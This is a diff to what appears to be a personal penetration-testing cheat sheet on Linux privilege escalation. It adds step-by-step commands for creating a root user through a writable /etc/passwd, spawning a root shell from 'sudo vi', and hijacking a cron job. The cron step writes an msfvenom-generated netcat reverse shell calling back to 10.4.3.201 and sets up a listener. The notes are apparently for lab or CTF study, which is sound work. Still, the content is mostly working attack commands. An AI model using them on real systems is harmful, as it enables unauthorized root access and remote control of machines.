@@ -42,6 +42,7 @@ https://github.com/NullArray/RootHelper
 
 ---
 # Priv Esc
+
 ## Exploiting SUID Files
 
 SUID files: Look like
@@ -59,26 +60,51 @@ OR
 Use this command to search the system for SUID/GUID files:
 `find / -perm -u=s -type f 2>/dev/null"** to search the file system for SUID/GUID files
 
+
+
 ## Exploiting a writable /etc/passwd
 
 example entry of a user
 `test:x:0:0:root:/root:/bin/bash
 
-create a compliant password hash to add to our new user
+1. create a compliant password hash to add to our new user
 `openssl passwd -1 -salt [salt] [password]
-create a user entry to add onto /etc/passwd
+2. create a user entry to add onto /etc/passwd
 ```
 nano /etc/passwd
 new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:/root:/bin/bash"
 ```
-switch to your new user and enter passwd
+3. switch to your new user and enter passwd
 `su new`
-you should have root
+4. you should have root
 `sudo -i
+
 
 ## Escaping Vi Editor
 
+use `sudo -l` to discover if that user can run any binaries with root privileges
 
+[GTFOBins](https://gtfobins.github.io/) is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions
+
+1. open vi as root, by typing `sudo vi`
+2. type `:!sh` to open a shell!
+
+
+
+## Exploiting Crontab
+
+view scheduled cron jobs
+`cat /etc/crontab
+
+crontabs have the following format:
+`<ID> <minute> <hour> <day of month> <month> <day of week> <user> <command>
+
+1. create a reverse shell payload for the cronjob to run 
+`msfvenom -p cmd/unix/reverse_netcat lhost=LOCALIP lport=8888 R
+2. replace the binary with the payload
+`echo "mkfifo /tmp/ujlow; nc 10.4.3.201 8888 0</tmp/ujlow | /bin/sh >/tmp/ujlow 2>&1; rm /tmp/ujlow" > autoscript.sh`
+3. start listener and wait for shell to land
+`nc -lvnp 8888`
 
 ---
 # Handy Nix Files
